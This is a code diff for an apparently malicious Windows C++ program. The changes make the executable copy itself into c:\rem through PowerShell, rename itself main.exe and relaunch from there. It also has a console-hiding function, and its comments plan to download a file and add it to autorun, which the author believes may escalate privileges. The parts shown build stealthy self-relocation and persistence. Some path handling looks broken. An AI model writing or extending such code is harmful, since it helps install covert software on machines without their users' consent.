@@ -103,10 +103,16 @@ bool separate(){
 }
 
 string parsefilename(string otp){
-	for(int i=0;i < otp.size(); i++){
-		cout << i << "\n";
+	string fname;
+	char curr;
+	for(int i=otp.size()-1;i > 0; i--){
+		fname+=otp[i];
+		curr=otp[i];
+		if(curr=='\\' || curr=='/' || curr==':'){
+			return fname;
+		}
 	}
-return "x";
+return fname;
 }
 
 string getexepath()
@@ -115,35 +121,46 @@ string getexepath()
   return std::string( result, GetModuleFileName( NULL, result, MAX_PATH ) );
 }
 
+string strev(string str)
+{
+    int n = str.length();
+    for (int i = 0; i < n / 2; i++)
+        swap(str[i], str[n - i - 1]);
+return str;
+}
+
 void hidecon()
 {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 }
 int main(){
-    hidecon();
+    //();
     bool ran=1;
     char dataxt[] = ".\\data.txt";
     //boot
-	fstream trace;
 	string tmp3;
+	//check for location > if not rem, cp to rem and run rem version ( this probably escalates previleges & easy actualization)?
 	string otp = getexepath();
-	trace.open("path", ios::in);
 	if(getexepath() != "C:\\rem\\main.exe"){
 		system("powershell mkdir c:\\rem");
-		string cm = "powershell cp ";
+		string cm = "powershell cp '";
 		cm+=otp;
-		cm+=" c:\\rem";
-		cout << cm << "\n";
+		cm+="' c:\\rem";
+		//cout << cm << "\n";
 		system(cm.c_str());
 		cm.clear();
-		cm="powershell Rename-Item ";
-		cm+=parsefilename(otp);
-		//system();
+		cm="powershell Rename-Item c:\\rem";
+		string tmp4 = parsefilename(otp);
+		cm+=strev(tmp4);
+		cm+=" main.exe";
+		cout << system(cm.c_str()) << "\n";
+		sleep(600);
+		cout << system("c:\\rem\\main.exe");
 	}
 	bool isc=0;
 		cout << " " << otp << "\n";
 		
-		//check for location > if not rem, cp to rem and run rem
+		
 
 		//wait for download of .ink
 		//add downloaded .ink to autorun
